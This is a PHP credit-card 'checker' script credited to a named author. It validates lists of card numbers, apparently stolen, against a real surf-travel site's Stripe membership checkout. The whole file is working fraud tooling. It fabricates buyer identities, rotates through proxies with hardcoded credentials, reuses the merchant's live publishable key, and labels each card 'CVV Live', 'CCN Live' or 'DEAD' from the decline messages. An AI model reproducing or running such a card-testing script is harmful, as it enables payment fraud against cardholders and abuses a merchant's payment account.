<?php

//=============================================================//
//================[Made By :- [🇮🇳] 𝙎𝙃𝙄𝙑𝘼𝙉𝙎𝙃 𝘽𝘼𝙉𝙎𝘼𝙇 ]===============//
//=============================================================//



//=============================================================//
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//=============================================================//


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//

//=======================[Proxys]=============================//
$rp1 = array(
  1 => 'igapfgvg-rotate:4spo27fv5idh',
  2 => 'xisgtcsp-rotate:bysis7ldgeqr',
  3 => 'sbeccyps-rotate:l8csvh9thjwr',
  4 => 'qurepbig-rotate:q2e48jo9qbnf',
  5 => 'fdxwdyhd-rotate:43ilmz2pf1ad',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

//echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][country]=VN&billing_details[name]=Devin+Ashley&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e381308a-ab56-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV4497-8e88-2bc14ada1eff3dcd00&pasted_fields=number&payment_user_agent=stripe.js%2F63dd81c55%3B+stripe-js-v3%2F63dd81c55&time_on_page=99919&referrer=https%3A%2F%2Fwww.surfindonesia.com%2F&key=pk_live_J59fwU0HgMkxx91eCOgslwA000JgyBSUIE');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.surfindonesia.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.surfindonesia.com',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: _fbp=fb.1.1622446738278.679526493; __stripe_mid=9fd8390a-3c37-40f4-b07d-1a06334009ced558ac; __stripe_sid=577ef6f5-939e-4497-8e88-2bc14ada1eff3dcd00; pmpro_visit=1',
'origin: https://www.surfindonesia.com',
'referer: https://www.surfindonesia.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'x-requested-with: XMLHttpRequest',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username=gehisi&password=Pa%24%24w0rd%21&password2=Pa%24%24w0rd%21&bemail=roke%40mailinator.com&bconfirmemail=roke%40mailinator.com&fullname=&bfirstname=Devin&blastname=Ashley&bcountry=VN&CardType=visa&tos=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//



//=======================[MADE BY]==============================//

$MADEBY = "[🇮🇳] 𝙎𝙃𝙄𝙑𝘼𝙉𝙎𝙃 𝘽𝘼𝙉𝙎𝘼𝙇 ";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# -------------------------------------------------- [CVV Responses ] ------------------------------------------------------ #

if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
    echo '</br><span class="badge badge-success">Live ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">CVV Live ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
    echo '</br><span class="badge badge-success">Live ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">CVV Live ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #


# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #

elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
    echo '</br><span class="badge badge-success">CCN ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">CCN Live ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}


#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #



#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #

elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || (strpos($result2, "pickup_card."))){
    echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">DEAD ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}


# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #



# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #

elseif ((strpos($result2, 'card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
    echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">DEAD ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

elseif ((strpos($result2, 'Payment cannot be processed, missing credit card number')) || (strpos($result2, "missing_payment_information")) || (strpos($result2, 'three_d_secure_redirect')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, "service_not_allowed")) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, 'Your card does not support this type of purchase.')) || (strpos($result2, "transaction_not_allowed"))){
    echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">DEAD ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

elseif (strpos($result2,  'Your card has expired.')) {
  echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">R ➜ Your card has expired. ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

elseif (strpos($result2,  'Your card number is incorrect.')) {
  echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">R ➜ Your card number is incorrect. ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #



# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #
elseif 
(strpos($result2,  '-1')) {
	echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">Reason: Update Nonce  ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}

else {
	echo '</br><span class="badge badge-success">DEAD ➜ </span> : <span class="badge badge-primary"> ' . $lista . ' ➜ </span><span class="badge badge-success">Reason: Dead Proxy/Error Not listed/CC Checker Dead  ➜ </span><span class="badge badge-warning">IP: '.$ip.' ➜ </span><span class="badge badge-info">Card Type:- ' . $type . ' ➜ Level:- ' . $brand . ' ➜ Bank:- ' . $bank . ' ➜</span><span class="badge badge-dark">Country:- ' . $country . ' ➜ Bin:- ' . $bin . ' ➜ Time: '.$time.' s ➜ </span><span class="badge badge-success">' . $MADEBY . '</span></br>';
}
//=======================[Responses-END]==============================//

curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";

//=============================================================//
//================[Made By :- [🇮🇳] 𝙎𝙃𝙄𝙑𝘼𝙉𝙎𝙃 𝘽𝘼𝙉𝙎𝘼𝙇 ]===============//
//=============================================================//
?>